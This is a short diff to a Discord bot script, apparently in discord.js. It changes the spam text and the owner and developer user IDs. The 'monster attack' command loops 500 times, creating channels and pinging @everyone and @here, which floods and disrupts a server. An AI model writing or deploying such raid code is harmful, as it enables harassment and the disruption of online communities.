@@ -17,7 +17,7 @@ client.on('message' , async (message) => {
     if (message.content.startsWith('monster attack')) {
 for (let i = 0; i < 500; i++) {
         message.guild.createChannel(' Dating Team ', 'text')
-        message.channel.send('@everyone __**Atlantic Team join us **__ :muscle: :v: @here');
+        message.channel.send('@everyone __** NO LOVE NO TRUST im done  **__ :muscle: :v: @here');
 }
 }
 });   
@@ -27,7 +27,7 @@ for (let i = 0; i < 500; i++) {
 
   client.on('message',async message => {
     if(message.content.startsWith("dm restart")) {
-          if(message.author.id !== "444339372884754435") return message.reply('You aren\'t the bot owner.');
+          if(message.author.id !== "487314985362391060") return message.reply('You aren\'t the bot owner.');
         message.channel.send('**Restarting.**').then(msg => {
             setTimeout(() => {
                msg.edit('**Restarting..**');
@@ -55,7 +55,7 @@ client.on('message' , async (message) => {
 });
 
 
-const developers = ["444339372884754435","412302921972056066",]
+const developers = ["451068327599669259","487314985362391060",]
 const adminprefix = "#";
 client.on('message', message => {
     var argresult = message.content.split(` `).slice(1).join(' ');
